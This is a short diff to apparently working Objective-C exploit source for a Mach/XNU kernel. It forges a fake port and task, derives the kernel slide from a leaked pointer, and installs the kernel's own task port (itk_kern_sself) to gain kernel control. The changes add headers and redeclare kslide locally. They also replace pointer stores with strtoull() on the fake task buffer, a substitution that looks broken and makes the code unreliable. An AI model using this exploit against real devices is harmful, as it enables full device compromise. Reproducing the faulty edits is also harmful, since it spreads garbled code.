@@ -13,8 +13,12 @@
 #import <pthread.h>
 #undef __IPHONE_OS_VERSION_MIN_REQUIRED
 #import <mach/mach.h>
+#import <mach/mach_vm.h>
 #include <sys/utsname.h>
 #include <assert.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
 
 #define kIOMasterPortDefault MACH_PORT_NULL
 #define IO_OBJECT_NULL MACH_PORT_NULL
@@ -299,7 +303,7 @@ gotclock:;
     fakeport->io_references = 0xff;
     char* faketask = ((char*)fakeport) + 0x1000;
     
-    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
+    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = strtoull(faketask, NULL, 0);
     *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
     *(uint64_t*) (faketask + 0x10) = 0xee;
 
@@ -320,7 +324,7 @@ gotclock:;
     
     //found kernel base
     uint64_t kernel_base = leaked_ptr;
-    kslide = kernel_base - 0xFFFFFF8000200000;
+    uint64_t kslide = kernel_base - 0xFFFFFF8000200000;
 
     
     //0xFFFFFF8000ABC490 _allproc
@@ -378,7 +382,7 @@ gotclock:;
     memcpy(faketask, ktaskdump, 0x1000);
     
     
-    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
+    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = strtoull(faketask, NULL, 0);
     *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
     
     *(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;
